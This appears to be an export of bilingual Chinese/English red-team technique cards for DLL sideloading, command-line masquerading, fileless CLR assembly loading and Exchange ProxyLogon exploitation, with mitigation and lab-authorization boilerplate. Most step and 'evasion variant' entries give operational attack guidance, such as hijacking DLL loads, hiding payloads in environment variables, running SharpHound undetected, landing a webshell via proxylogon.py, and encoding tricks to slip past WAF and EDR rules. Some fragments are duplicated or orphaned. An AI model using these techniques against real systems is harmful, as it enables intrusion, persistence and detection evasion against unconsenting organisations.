mitigation.en: Configure application directories as administrator-writable only, enforce dependency signature checks, and remove surplus DLLs; monitor module loads from abnormal paths with Sysmon event 7. After the fix, regress with the step 3 sample: sideloading candidates must be blocked by ACLs or signature policy.

description.zh: 对宿主程序运行 Get-AuthenticodeSignature；Status 为 Valid 即主程序签名完整，替换依赖不会破坏其签名态。
description.en: Run Get-AuthenticodeSignature on the host binary; a Valid status means swapping dependencies leaves the signed state intact.

description.zh: 对同目录依赖 DLL 逐一验签；存在 NotSigned 或 Unknown 状态的模块即缺少校验的可替换缺口。
description.en: Verify each dependency DLL in turn; NotSigned or Unknown modules are unchecked replacement gaps.

title.zh: 投放同名 DLL 劫持加载
title.en: Drop a DLL to hijack the load

description.zh: 把载荷 DLL 以目标模块名放入搜索顺序前列后启动宿主程序；载荷随签名进程加载并执行即侧加载接管完成，EDR 视角全程合法。
description.en: Name the payload DLL after the target module and place it earlier in the search order, then start the host; loading inside the signed process completes the sideload takeover.

analysis.zh: DLL 侧加载搜索顺序检测只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: DLL Sideloading Search-Order Detection is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 使用签名应用和不可执行标记 DLL 核对加载路径、签名与目录 ACL，不构建代理 DLL。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

title.zh: 当前目录优先规避变体

description.zh: 绕过应用目录监控：DLL 置于当前目录利用搜索顺序优先加载。成功判据：代理 DLL 被应用加载执行。
description.en: Evades application-directory monitoring by placing the DLL in the current directory to win the search order. Success: the proxy DLL loads and executes in the application.

description.zh: 绕过根目录 DLL 扫描：利用清单/SxS 的语言子目录搜索加载代理。成功判据：子目录 DLL 被加载。
description.en: Evades root-directory DLL scanning by exploiting manifest/SxS language-subfolder probing. Success: the subfolder DLL loads.

title.zh: COM CLSID 劫持规避变体

description.zh: 绕过文件系统级侧加载检测：经 HKCU CLSID 注册表劫持让系统加载指定 DLL。成功判据：触发 COM 激活时代理 DLL 加载。
description.en: Evades filesystem-level sideload detection by hijacking an HKCU CLSID so the system loads the designated DLL on COM activation. Success: the proxy DLL loads when the COM class activates.

name.zh: 进程参数多源遥测审计

description.zh: 进程参数多源遥测审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: Process-Argument Multi-Source Telemetry Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

category.zh: 终端防护与遥测完整性

subCategory.zh: 进程伪装与内存载荷规避

prerequisites.zh: 确认 进程参数多源遥测审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Process-Argument Multi-Source Telemetry Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 进程参数多源遥测审计覆盖命令行伪装检测场景：针对依赖单一命令行来源的检测逻辑，验证 lpApplicationName 与 lpCommandLine 不一致、环境变量执行等变体能否被识别。验证维度涵盖创建参数不一致执行、变量间接执行与多源命令行比对三类。
overview.en: Process-Argument Multi-Source Telemetry Audit covers command-line masquerading detection: for detection logic relying on a single command-line source, verify whether variants such as lpApplicationName/lpCommandLine inconsistency and environment-variable execution are recognizable. Verification dimensions cover inconsistent creation arguments, indirect variable execution, and multi-source command-line comparison.

vulnerability.zh: 根因是进程的 lpApplicationName 与 lpCommandLine 可分别指定，环境变量展开又发生在 cmd 进程内部，检测若只读取其中一处即被另一处欺骗；内核创建事件、PEB 与 WMI 等多源遥测之间的差异是核心检测信号。
vulnerability.en: The root cause is that lpApplicationName and lpCommandLine are specified independently and environment-variable expansion happens inside the cmd process, so a detection reading only one is deceived by the other; divergence across multi-source telemetry — kernel creation events, PEB, and WMI — is the core detection signal.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步以 lpApplicationName 指向 cmd.exe 而 lpCommandLine 写入另一条命令创建进程，多源遥测记录出现差异即确认伪装成立；第 2 步用环境变量间接执行使命令行仅见变量名，对比检测可见性差异；第 3 步用 Win32_Process 输出命令行清单，与内核侧数据比对完成伪装识别验证。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 creates a process with lpApplicationName pointing at cmd.exe while lpCommandLine carries a different command — divergence across telemetry sources confirms the masquerade; step 2 executes indirectly via an environment variable so the command line shows only the variable name, comparing detection visibility; step 3 lists command lines with Win32_Process and compares against kernel-side data to finish validation. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 检测侧交叉核对 ETW 内核创建事件与 PEB/WMI 命令行快照，对创建参数不一致与可疑变量间接执行告警，并保留原始审计数据防篡改。修复后用第 1、2 步样例回归，伪装变体应触发多源差异告警。
mitigation.en: Cross-check ETW kernel creation events against PEB/WMI command-line snapshots, alert on inconsistent creation arguments and suspicious indirect variable execution, and retain raw audit data against tampering. After the fix, regress with the step 1 and step 2 samples: masquerade variants must trigger multi-source divergence alerts.

title.en: Split arguments to fake the command line

description.zh: CreateProcess 时把真实程序放 lpApplicationName、把伪装命令写入 lpCommandLine；进程执行恶意程序而日志记录合法参数。
description.en: In CreateProcess put the real binary in lpApplicationName and the benign text in lpCommandLine; the malicious binary runs while logs record the benign arguments.

title.zh: 环境变量中转隐藏载荷

description.zh: 先 set EVIL=真实命令，再以 cmd /c %EVIL% 启动；命令行字面不含载荷即再过一层日志与 EDR 审查。
description.en: Set EVIL to the real command, then launch via cmd /c %EVIL%; the literal command line carries no payload, slipping past another layer of logging.

description.zh: 用 Get-CimInstance 拉取进程 CommandLine 与 ETW 事件对照；两源记录不一致即该盲区可长期复用。
description.en: Pull CommandLine via Get-CimInstance and compare with ETW events; divergent records mark a blind spot for long-term reuse.

analysis.zh: 进程参数多源遥测审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Process-Argument Multi-Source Telemetry Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 比较创建事件、PEB 快照和安全产品命令行字段，不修改 PEB 或隐藏参数。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

title.zh: 可变缓冲区覆写规避变体

description.zh: 绕过命令行快照一致性校验：CreateProcess 后进程内覆写参数缓冲区，遥测读到的与执行的不同。成功判据：进程行为与记录命令行不匹配。
description.en: Evades command-line snapshot consistency checks by overwriting the parameter buffer after CreateProcess so telemetry and execution diverge. Success: process behavior mismatches the recorded command line.

title.zh: 环境变量间接传递规避变体

description.zh: 绕过命令行参数扫描：敏感命令藏于环境变量，进程参数仅见变量引用。成功判据：as.log 生成且命令行无明文命令。
description.en: Evades command-line scanning by hiding the sensitive command in an environment variable so process args only show the reference. Success: as.log appears with no plaintext command in the args.

title.zh: 延迟展开变形规避变体

description.zh: 绕过参数全文匹配：延迟展开拼接命令词，快照中无完整命令。成功判据：as2.log 生成。
description.en: Evades full-parameter matching via delayed expansion that assembles command words after the snapshot. Success: as2.log appears.

name.zh: CLR 程序集加载遥测审计

description.zh: CLR 程序集加载遥测审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: CLR Assembly-Load Telemetry Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

category.zh: 终端防护与遥测完整性

subCategory.zh: 应用控制与 LOLBin 绕过

prerequisites.zh: 确认 CLR 程序集加载遥测审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for CLR Assembly-Load Telemetry Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: CLR 程序集加载遥测审计覆盖 .NET 程序集加载场景：针对依赖 CLR 事件日志的检测机制，验证签名无害程序集的加载能否被稳定记录。验证维度涵盖 .NET Runtime 日志基线读取、反射加载程序集并调用入口点、加载后日志比对三类。
overview.en: CLR Assembly-Load Telemetry Audit covers .NET assembly loading: for detection relying on CLR event logs, verify whether loading a benign signed assembly is reliably recorded. Verification dimensions cover .NET Runtime log baselines, reflective assembly loading with entry-point invocation, and post-load log comparison.

vulnerability.zh: 根因是 CLR 允许在既有 .NET 进程内通过 Assembly.Load 加载任意程序集并调用入口点，进程身份保持不变；DotNETRuntime 运维日志与 ETW 采集未启用时，加载行为仅剩文件访问痕迹，极易漏检。
vulnerability.en: The root cause is that the CLR permits Assembly.Load of arbitrary assemblies inside an existing .NET process with entry-point invocation, keeping the process identity unchanged; without DotNETRuntime operational logs and ETW collection, loading leaves only file-access traces and is easily missed.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步读取 Microsoft-Windows-DotNETRuntime/Operational 最新 20 条日志建立基线；第 2 步用 Assembly.Load 加载目标二进制并反射调用 EntryPoint，程序集执行即确认加载链路；第 3 步再次读取日志并与基线比对，出现对应加载记录即确认遥测覆盖有效，无记录则说明检测存在缺口。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 reads the latest 20 Microsoft-Windows-DotNETRuntime/Operational entries as a baseline; step 2 loads the target binary with Assembly.Load and invokes EntryPoint reflectively — assembly execution confirms the load path; step 3 re-reads the log and compares against the baseline — a matching load record confirms telemetry coverage, while absence reveals a detection gap. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 启用 DotNETRuntime/Operational 日志与 CLR ETW 提供程序并集中采集，监控进程内异常程序集加载与无文件映像的内存加载，用应用控制限制 Assembly.Load 来源。修复后用第 1-3 步样例回归，加载行为应产生完整遥测或被策略阻止。
mitigation.en: Enable DotNETRuntime/Operational logs and CLR ETW providers with central collection, monitor abnormal in-process assembly loads and fileless in-memory loads, and restrict Assembly.Load sources via application control. After the fix, regress with the step 1-3 samples: loads must produce complete telemetry or be blocked by policy.

description.zh: 用 Get-WinEvent 拉取 DotNETRuntime/Operational 最近事件；记录事件类型与频率即掌握托管遥测的覆盖范围。
description.en: Pull recent DotNETRuntime/Operational events with Get-WinEvent; the event types and rates map the managed-telemetry coverage.

title.zh: 非托管进程加载托管载荷
title.en: Load a managed payload from an unmanaged host

description.zh: 在非托管宿主中调用 Assembly.Load(文件字节) 并 Invoke 入口；托管代码运行而磁盘无 DLL 落地即实现无文件注入。
description.en: In the unmanaged host call Assembly.Load(file bytes) and Invoke the entry point; managed code running with no DLL on disk is fileless injection.

title.zh: 比对事件缺口完成规避

description.zh: 再次读取同一日志；第 2 步的加载未产生对应事件即 CLR 遥测被规避，可安全运行 SharpHound 等托管工具。
description.en: Re-read the same log; no event for the step-2 load means CLR telemetry is evaded and managed tools like SharpHound can run safely.

analysis.zh: CLR 程序集加载遥测审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。

opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

description.zh: 绕过 powershell.exe 宿主与模块日志：自托管 CLR 执行等效 PowerShell，无引擎日志。成功判据：动作完成且无 PowerShell 通道日志。
description.en: Evades the powershell.exe host and module logging by self-hosting the CLR to run equivalent PowerShell without engine logs. Success: the action completes with no PowerShell channel logs.

title.zh: 反射方法直调规避变体

description.zh: 绕过 Process.Start 型命令执行检测：以反射直调入口点，无子进程生成。成功判据：入口执行且无新进程。
description.en: Evades Process.Start-style execution detection by invoking the entry point via reflection with no child process. Success: the entry executes with no new process.

title.zh: COMPlus 加载器变形规避变体

description.zh: 绕过默认加载上下文的 ALC 审计：调整 CLR 加载器环境后按路径加载。成功判据：程序集执行且默认上下文无加载记录。
description.en: Evades default-context ALC auditing by tuning the CLR loader environment then loading by path. Success: the assembly executes with no default-context load record.

name.zh: Exchange ProxyLogon 补丁回归

description.zh: Exchange ProxyLogon 补丁回归保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。

Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 Exchange ProxyLogon 补丁回归 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Exchange ProxyLogon Patch Regression are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: Exchange ProxyLogon 补丁回归覆盖 SSRF 与反序列化组合利用场景：针对未安装 2021-03 补丁的 Exchange 服务器，验证前端到后端代理链与管理员会话获取链路。验证维度涵盖前置路径探测、proxylogon 一键利用与手工代理请求复现三类步骤。
overview.en: Exchange ProxyLogon Patch Regression covers combined SSRF and deserialization exploitation: for Exchange servers without the 2021-03 patch, verify the front-end-to-back-end proxy chain and admin-session acquisition. Verification dimensions cover the pre-condition path probe, one-shot proxylogon exploitation, and manual proxy request replay.

vulnerability.zh: 根因是 Exchange 前端对 /owa/auth/x.js 等静态资源不认证即转发后端，攻击者借 set-OwaVirtualDirectory 端到端 SSRF 以 Exchange 机器账户身份获得后端权限，再经后端反序列化缺陷执行代码；补丁缺失与前后端信任边界过宽共同构成利用条件。
vulnerability.en: The root cause is that the Exchange front end forwards static resources such as /owa/auth/x.js to the back end without authentication; end-to-end SSRF via set-OwaVirtualDirectory grants back-end access as the Exchange machine account, after which a back-end deserialization flaw executes code. The missing patch plus an overly broad front-end/back-end trust boundary form the exploitation conditions.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步请求 /owa/auth/x.js，返回非 404 即确认前置可达路径存在；第 2 步在授权实验环境运行 proxylogon.py，获取管理员会话并输出服务器名或内存马地址即确认利用成功；第 3 步用手工 POST 复现 Cookie 代理链（X-AnonResource-Backend 指向 ecp/default.flt），返回 ECP 响应即确认代理链路成立。EXCHANGE_HOST 等占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 requests /owa/auth/x.js — any non-404 response confirms the pre-condition path exists; step 2 runs proxylogon.py in an authorized lab — an admin session with the server name or webshell URL printed confirms exploitation; step 3 replays the Cookie proxy chain manually (X-AnonResource-Backend pointing at ecp/default.flt) — an ECP response confirms the proxy path. Replace EXCHANGE_HOST and other placeholders via the global variables menu.

mitigation.zh: 升级至受支持 CU 并安装 2021-03+ 安全更新，用 Exchange Server Health Checker 核验补丁状态；限制 ECP/PowerShell 暴露并审计异常 Autodiscover、EWS 与邮箱权限变更。修复后用第 1、2 步样例回归，代理链应返回 404/401 且利用失败。
mitigation.en: Upgrade to a supported CU and install 2021-03+ security updates, verifying patch state with the Exchange Server Health Checker; restrict ECP/PowerShell exposure and audit anomalous Autodiscover, EWS, and mailbox permission changes. After the fix, regress with the step 1 and step 2 samples: the proxy chain must return 404/401 and exploitation must fail.

title.zh: 探测 Exchange 前端暴露

description.zh: 用 curl 访问 /owa/auth/x.js 静态路径；返回 200 与版本特征即定位 CAS 前端角色并确认服务器在线。
description.en: Fetch /owa/auth/x.js with curl; a 200 with version fingerprints locates the CAS front-end role and confirms the server is live.

description.zh: 运行 proxylogon.py 指定目标与管理员邮箱；输出 LegacyDN 与 canary 即拿到经 SSRF 直达后端 ecp 的会话凭证。
description.en: Run proxylogon.py against the target and admin mailbox; LegacyDN and canary output are session material reaching the backend ecp via SSRF.

title.en: Land a webshell with raw requests

description.zh: 构造携带 X-AnonResource-Backend 与ClientId 的 POST 写入目标路径；服务器目录出现 webshell 文件即完成 RCE 持久入口。
description.en: Craft the POST with X-AnonResource-Backend and ClientId headers to write your path; a webshell on disk completes the persistent RCE foothold.

review.rationale: 核对 Exchange 精确版本、补丁、前端/后端路由与无会话响应，不运行利用脚本。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

description.zh: 绕过按 localhost/ecp/default.flt?~3 字面匹配 X-AnonResource-Backend 的 WAF 规则：将主机换成 127.0.0.1、对 / ? ~ # 分别做 %2F %3F %7E %23 单元编码并改大小写，Cookie 解码后 SSRF 链等价而签名不命中；成功判据：响应仍出现 X-FEServer/X-CalculatedBETarget 头或 FBA 行为与原链一致。
description.en: Bypasses WAF rules matching the literal localhost/ecp/default.flt?~3 in X-AnonResource-Backend: swapping to 127.0.0.1 and unit-encoding / ? ~ # as %2F %3F %7E %23 with case variance keeps the decoded SSRF chain equivalent; success criterion: response still carries X-FEServer/X-CalculatedBETarget or identical FBA behavior.

description.zh: 绕过对 X-BEResource 中 %23~ 定界符（后端定位 + 端口）特征拦截：一次编码 %23、双重编码 %2523、主机大小写与 ~1/~3 端口变体在反代解码后仍指向后端邮箱服务器；成功判据：响应非 401/403 且出现后端服务器特征（X-BEVersion/X-DiagInfo），说明请求被转发到后端角色。
description.en: Bypasses rules keyed on the %23~ delimiter in X-BEResource (backend host + port): single %23, double %2523, host case and ~1/~3 port variants still resolve to the backend mailbox server after proxy decoding; success criterion: a non-401/403 response with backend markers (X-BEVersion/X-DiagInfo) proves backend routing.

title.zh: Legacy 前端路径变形探测

description.zh: 绕过仅对 /owa/auth/x.js 精确匹配的拦截与封禁：点段、双斜杠、大小写、%23 截断、; 截断与尾斜杠在 Exchange 前端规范化后仍命中 FBA 匿名端点；成功判据：变形路径返回与原始 x.js 相同的 200 状态与 FBA 页面指纹。
description.en: Bypasses blocks anchored to the exact /owa/auth/x.js: dot segments, double slashes, case, %23 or ; truncation and trailing slash still hit the FBA anonymous endpoint after front-end normalization; success criterion: variants return the same 200 and FBA page fingerprint as the original x.js.

description.zh: 绕过只对 GET/POST + HTTP/1.1 组合建模的 WAF 规则：HTTP/1.0、GET 带 Cookie、OPTIONS 与 chunked 传输在部分引擎走不同解析路径；成功判据：任一组合仍能携带 X-AnonResource-Backend 触发后端 SSRF 行为（响应头含 X-FEServer 或 FBA 特征）。
description.en: Bypasses WAF rules modeling only GET/POST over HTTP/1.1: HTTP/1.0, GET with cookies, OPTIONS and chunked bodies take different parser paths in some engines; success criterion: any combination still carries X-AnonResource-Backend to trigger backend SSRF behavior (X-FEServer header or FBA signature).

Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.
